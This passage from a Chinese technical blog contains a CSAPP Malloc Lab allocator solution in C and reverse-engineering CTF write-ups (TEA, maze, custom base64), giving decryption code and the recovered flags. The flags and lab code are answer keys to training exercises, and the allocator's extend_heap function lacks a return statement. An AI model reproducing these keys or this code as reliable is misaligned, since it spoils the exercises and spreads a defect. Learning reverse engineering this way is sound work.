<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><h3 id="I-操作空闲链表的常数和宏"><a href="#I-操作空闲链表的常数和宏" class="headerlink" title="I . 操作空闲链表的常数和宏"></a>I . 操作空闲链表的常数和宏</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WSIZE 4     <span class="comment">//一字的字节</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DSIZE 8     <span class="comment">//两字的字节</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNKSIZE (1&lt;&lt;12)       <span class="comment">//延展一次堆的字节数</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX(x,y) ((x) &gt; (y) ? (x) : (y))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN(x,y) ((x) &lt; (y) ? (x) : (y))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//大小或上分配位打包的标志字</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACK(size,alloc) ((size) | (alloc))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//读写p指针处的一个字</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET(p) (*(unsigned int *)(p))       </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT(p,val) (*(unsigned int *)(p) = (val))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//读取标志字中的大小和分配状态</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_SIZE(p) (GET(p) &amp; ~0x7)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//给出开头或结尾标志字的位置(bp指针指向块的有效载体)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HDRP(bp) ((char *)(bp) - WSIZE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FTRP(bp) ((char *)(bp) - DSIZE + GET_SIZE(HDRP(bp)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//给出前一个或下一个块的bp指针</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_BLKP(bp) ((char *)(bp) - GET_SIZE((char *)(bp) - DSIZE))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> * heap_listp;</span><br><span class="line"><span class="comment">//下次适配记录之前的块</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> * prev_listp;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>p是一个void * 指针，所以强制转换是必要的；</p>
<h3 id="II-创建空闲列表（堆）"><a href="#II-创建空闲列表（堆）" class="headerlink" title="II . 创建空闲列表（堆）"></a>II . 创建空闲列表（堆）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mm_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="comment">//分配4个字(1个初始填充，2个序言，1个结尾)</span></span><br><span class="line">    <span class="keyword">if</span>((heap_listp = mem_sbrk(<span class="number">4</span>*WSIZE)) == (<span class="keyword">void</span> *)<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    PUT(heap_listp,<span class="number">0</span>);</span><br><span class="line">    PUT(heap_listp + WSIZE,PACK(DSIZE,<span class="number">1</span>));</span><br><span class="line">    PUT(heap_listp + (<span class="number">2</span> * WSIZE),PACK(DSIZE,<span class="number">1</span>));</span><br><span class="line">    PUT(heap_listp + (<span class="number">3</span>*WSIZE),PACK(<span class="number">0</span>,<span class="number">1</span>));</span><br><span class="line">    heap_listp += (<span class="number">2</span>*WSIZE);</span><br><span class="line">    prev_listp = heap_listp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//延展空闲块</span></span><br><span class="line">    <span class="keyword">if</span>(extend_heap(CHUNKSIZE/WSIZE) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> * <span class="title">extend_heap</span><span class="params">(<span class="keyword">size_t</span> words)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> * bp;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//满足2字对齐</span></span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words + <span class="number">1</span>) * WSIZE : words * WSIZE;</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//设置填充空闲块的头和尾，以及延展一个结束字</span></span><br><span class="line">    PUT(HDRP(bp),PACK(size,<span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp),PACK(size,<span class="number">0</span>));</span><br><span class="line">    PUT(HDRP(NEXT_BLKP(bp)),PACK(<span class="number">0</span>,<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//合并空闲块，如果前面是的话</span></span><br><span class="line">    prev_listp = coalesce(bp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mm_init函数在创建初始堆空间；extend_heap函数在延展空闲块，用在init里，当然也可以用在当申请空间不足时的地方，所以单独成为一个函数；coalesce之后会讲到，是合并空闲块的函数，在填充和释放时用到；</p>
<p>注意，首次适配所记录的当前块指针如果被向前合并，则记录指针也需要随之改变，所以最好运用合并函数的地方都使其返回的值成为prev_listp；</p>
<h3 id="III-释放和合并块"><a href="#III-释放和合并块" class="headerlink" title="III . 释放和合并块"></a>III . 释放和合并块</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mm_free</span><span class="params">(<span class="keyword">void</span> * bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置头尾分配位0</span></span><br><span class="line">    PUT(HDRP(bp),PACK(size,<span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp),PACK(size,<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    prev_listp = coalesce(bp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">coalesce</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));</span><br><span class="line">    <span class="keyword">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4种情况，前后块都是分配的，前后块都没分配，前后块有一者分配</span></span><br><span class="line">    <span class="keyword">if</span>(prev_alloc &amp;&amp; next_alloc)</span><br><span class="line">    &#123;	</span><br><span class="line">    	<span class="keyword">return</span> bp;</span><br><span class="line">	&#125;    </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!prev_alloc &amp;&amp; next_alloc)</span><br><span class="line">    &#123;</span><br><span class="line">        size += GET_SIZE(FTRP(PREV_BLKP(bp)));</span><br><span class="line">        PUT(FTRP(bp),PACK(size,<span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)),PACK(size,<span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(prev_alloc &amp;&amp; !next_alloc)</span><br><span class="line">    &#123;</span><br><span class="line">        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">        PUT(HDRP(bp),PACK(size,<span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp),PACK(size,<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        size += GET_SIZE(HDRP(NEXT_BLKP(bp))) + GET_SIZE(FTRP(PREV_BLKP(bp)));</span><br><span class="line">        PUT(FTRP(NEXT_BLKP(bp)),PACK(size,<span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)),PACK(size,<span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在第二个else if 的地方，HDRP需要写前面，因为FTRP会用HDRP处的内容；</p>
<h3 id="IV-放置和分割块"><a href="#IV-放置和分割块" class="headerlink" title="IV . 放置和分割块"></a>IV . 放置和分割块</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="comment">// 调整后大小</span></span><br><span class="line">    <span class="keyword">size_t</span> asize;</span><br><span class="line">    <span class="comment">//延展大小</span></span><br><span class="line">    <span class="keyword">size_t</span> extendsize;</span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//忽视无用请求</span></span><br><span class="line">    <span class="keyword">if</span>(size == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//调整对齐要求</span></span><br><span class="line">    <span class="keyword">if</span>(size &lt;= DSIZE)</span><br><span class="line">        asize = <span class="number">2</span> * DSIZE;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="comment">//向上取整</span></span><br><span class="line">        asize = ((size + DSIZE + (DSIZE - <span class="number">1</span>)) / DSIZE) * DSIZE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//放置块</span></span><br><span class="line">    <span class="keyword">if</span>((bp = find_fit(asize)) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        place(bp,asize);</span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//空间不够延展</span></span><br><span class="line">    extendsize = MAX(asize,CHUNKSIZE);</span><br><span class="line">    <span class="keyword">if</span>((bp = extend_heap(extendsize/WSIZE)) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    place(bp,asize);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">find_fit</span><span class="params">(<span class="keyword">size_t</span> asize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> * bp;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//初始化使prev_listp指向了序言块</span></span><br><span class="line">    <span class="keyword">for</span>(bp = prev_listp; GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>; bp = NEXT_BLKP(bp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!GET_ALLOC(HDRP(bp)) &amp;&amp; (asize &lt;= GET_SIZE(HDRP(bp))))</span><br><span class="line">        &#123;</span><br><span class="line">            prev_listp = bp;</span><br><span class="line">            <span class="keyword">return</span> bp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//后面找没有之后从头找</span></span><br><span class="line">    <span class="keyword">for</span>(bp = heap_listp; bp != prev_listp; bp = NEXT_BLKP(bp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!GET_ALLOC(HDRP(bp)) &amp;&amp; (asize &lt;= GET_SIZE(HDRP(bp))))</span><br><span class="line">        &#123;</span><br><span class="line">            prev_listp = bp;</span><br><span class="line">            <span class="keyword">return</span> bp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">place</span><span class="params">(<span class="keyword">void</span> * bp,<span class="keyword">size_t</span> asize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//原块长度</span></span><br><span class="line">    <span class="keyword">size_t</span> csize = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//分割后大小大于或等于最小块则执行分割</span></span><br><span class="line">    <span class="keyword">if</span>((csize - asize) &gt;= (<span class="number">2</span> * DSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">        PUT(HDRP(bp),PACK(asize,<span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp),PACK(asize,<span class="number">1</span>));</span><br><span class="line">        bp = NEXT_BLKP(bp);</span><br><span class="line">        PUT(HDRP(bp),PACK((csize - asize),<span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp),PACK((csize - asize),<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        PUT(HDRP(bp),PACK(csize,<span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp),PACK(csize,<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="V-重分配块大小"><a href="#V-重分配块大小" class="headerlink" title="V . 重分配块大小"></a>V . 重分配块大小</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_realloc</span><span class="params">(<span class="keyword">void</span> *bp, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> * old_bp = bp;</span><br><span class="line">    <span class="keyword">void</span> * new_bp;</span><br><span class="line">    <span class="keyword">size_t</span> oldsize, newsize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建新的分配块</span></span><br><span class="line">    new_bp = mm_malloc(size);</span><br><span class="line">    <span class="keyword">if</span>(new_bp == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    oldsize = GET_SIZE(HDRP(old_bp));</span><br><span class="line">    newsize = GET_SIZE(HDRP(new_bp));</span><br><span class="line">    <span class="comment">//比较新旧大小，如果新的更大，则复制原数据过去，如果更小，复制小的长度个原数据</span></span><br><span class="line">    <span class="keyword">if</span>(oldsize &lt; newsize)</span><br><span class="line">        newsize = oldsize;</span><br><span class="line">    <span class="comment">//取消结尾字</span></span><br><span class="line">    <span class="built_in">memcpy</span>(new_bp, old_bp, newsize-WSIZE);</span><br><span class="line">    mm_free(old_bp);</span><br><span class="line">    <span class="keyword">return</span> new_bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="VI-检测"><a href="#VI-检测" class="headerlink" title="VI . 检测"></a>VI . 检测</h3><p>将代码打包到mm.c，使用之前的编译命令，搞出有代码的 mdriver；输入以检测：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mdriver -V</span><br></pre></td></tr></table></figure>

<p>如图：</p>
<p><img src="https://s2.loli.net/2022/09/12/YFhJiKkL3Bdqbfp.jpg" alt="check"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此，实现了所分析的内容：</p>
<p>模拟空间，填充——extend_heap；</p>
<p>已分配和未分配的块——有头尾的列表模式以及宏定义的操作；</p>
<p>开头结尾——mm_init；</p>
<p>以及有小标题的放置，分割，释放，合并小函数；</p>
<hr>
<p><img src="https://s2.loli.net/2022/09/12/oKRc8yNQZOGXk9Y.jpg" alt="forest"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://secondbc.github.io/SecondBC/2022/09/11/Malloc-Lab/" data-id="cl7xhx3rr00004wvcch94fhug" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-假期复现" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/SecondBC/2022/08/18/%E5%81%87%E6%9C%9F%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time datetime="2022-08-18T15:26:21.000Z" itemprop="datePublished">2022-08-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/SecondBC/2022/08/18/%E5%81%87%E6%9C%9F%E5%A4%8D%E7%8E%B0/">假期复现</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="1-havetea"><a href="#1-havetea" class="headerlink" title="1 . havetea"></a>1 . havetea</h2><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/07/17/1376f9c70c6ecb62.png" alt="main"></p>
<p>左边是主函数里可以找到的，可以发现首先让输入key，且为16个长度，并且把输入的key分成两段进行了两次加密；在加密函数crypto里，是一个简单<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/TEA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/9383067?fr=aladdin">TEA运算</a>，只不过IDA抽风把 +=delta 翻译成了 -=补码；crypto又把输入的数据截成两段进行运算，使用的key可以在程序里找到；之后用加密数据进行比较；</p>
<p>知晓key和加密后的数据使用对应解密方式解密：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		r -= ((l&lt;&lt;<span class="number">4</span>) + c) ^ (l + sum) ^ ((l&gt;&gt;<span class="number">5</span>) + d);</span><br><span class="line">		l -= ((r&lt;&lt;<span class="number">4</span>) + a) ^ (r + sum) ^ ((r&gt;&gt;<span class="number">5</span>) + b);</span><br><span class="line">		sum -= delta;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>解密后得到输入为：<strong>please_drink_tea</strong></p>
<p><img src="https://i.bmp.ovh/imgs/2022/07/17/64d80edd5d6bb540.png" alt="end"></p>
<p>之后又让输入32长度的内容进行加密，并且用之前输入的16长度作为第二次加密cry的密钥；可以看出这次32长度的内容被分成了4段进行cry加密，而cry其实是和第一次的crypto差不多的TEA运算；加密完之后进行数据比较；</p>
<p>对应解密方式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		r -= (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) ^ (l + ((<span class="number">16</span> * l) ^ (l &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">		sum -= delta;</span><br><span class="line">		l -= (sum + key[sum &amp; <span class="number">3</span>]) ^ (r + ((<span class="number">16</span> * r) ^ (r &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>解密后得到：<strong>flag{c616454f52a6334273b5f455a10ef818}</strong></p>
<h2 id="2-maze"><a href="#2-maze" class="headerlink" title="2.maze"></a>2.maze</h2><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/07/134754dd288f1cbb.png" alt="main"></p>
<p>通过字符串搜索，找到主要函数，可以看到通过输入的v2来与v3进行 domaze 函数运算；右图为 domaze 函数，可以看出这是个三线迷宫，迷宫整体由v3控制，输入的v2代表玩家移动方向；</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/07/8e17607d241170f1.png" alt="maze"></p>
<p>通过调试可知，这是个指针制作的迷宫，前24位每8位代表一个方向，第25位开始往后是控制数；比如地址0x112E86A 为1，对应0x112E860处的方向的控制数，当这个控制数为 1 的时候，根据 domaze 函数的计算规则可知，会触发 sub_4C6470 结束函数；而最后一个 0 是代表是否走过这个路口，走过之后会变成 1；</p>
<p>之后通过这个规则去逆推回去：（这些是地址低三位）</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/07/9e28b505062294f5.png" alt="test"></p>
<p>正着写回去便是：<strong>rrrrtltltlllltlltrtrrr</strong>；</p>
<p>md5之后得到：<strong>flag{988b0f23719099efcbd66586a168bab9}</strong></p>
<h2 id="3-rota"><a href="#3-rota" class="headerlink" title="3.rota"></a>3.rota</h2><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/07/56ae438b00a5db8a.png" alt="main"></p>
<p>最上面图展示了最终的比较数据；中间左边的图则是一开始的base64编码，下面的图展示了base64的变种码表；中间右边的图展示了最后是生成了一个BOX，用BOX与base64编码后的内容进行加密；</p>
<p>中间有BOX的生成内容，但是无关紧要，因为生成的数据和输入的内容无关，所以是固定的，BOX也就是固定的；</p>
<p>所以只需要破解这个加密就能够得出最终结果；</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/07/3a718c1a2cd93ce8.png" alt="crypto"></p>
<p>以上为crypt函数的内容；</p>
<p>调试加分析加软磨硬泡得出爆破代码的核心内容：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> v10 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>):</span><br><span class="line">        v11 = v5</span><br><span class="line">        v12 = (v5 + BOX[(v3 + v10) &amp; <span class="number">0x3F</span>]) &amp; <span class="number">0x3F</span></span><br><span class="line">        v13 = (v3 + <span class="number">1</span>) &amp; <span class="number">0x3F</span></span><br><span class="line">        v14 = BOX[((result + BOX[v12 + <span class="number">64</span>]) &amp; <span class="number">0x3F</span>) + <span class="number">128</span>]</span><br><span class="line">        <span class="keyword">if</span>(ans[j] == b64box[v14]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(b64box[v10]))</span><br><span class="line">            BOX[<span class="number">192</span>] = v13</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span>(v10 == <span class="number">65</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;erorr&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">not</span> v13):</span><br><span class="line">      v5 = (v5 + <span class="number">1</span>) &amp; <span class="number">0x3F</span></span><br><span class="line">      BOX[<span class="number">193</span>] = v5</span><br><span class="line">      <span class="keyword">if</span>(((v11 + <span class="number">1</span>) &amp; <span class="number">0x3F</span>) == <span class="number">0</span>):</span><br><span class="line">        result = (result + <span class="number">1</span>) &amp; <span class="number">0x3F</span></span><br><span class="line">        BOX[<span class="number">194</span>] = result</span><br></pre></td></tr></table></figure>

<p>然后和原代码一样，该循环几次循环几次，该有几个有几个；</p>
<p>得出base64编码后的内容为：cAJ7BzX+6zHrHwnTc/i7Bz6f6t6EBQDvc/xfHt9d6S9XX</p>
<p>再base64解码一遍：</p>
<p><img src="https://s2.loli.net/2022/08/07/Lm2koeIsCA3PzSx.png" alt="base64"></p>
<p>得到：<strong>flag{8cdd01062b7e90dd372c3ea9977be53e}</strong></p>
<h2 id="4-gocode"><a href="#4-gocode" class="headerlink" title="4.gocode"></a>4.gocode</h2><p>IDA：</p>
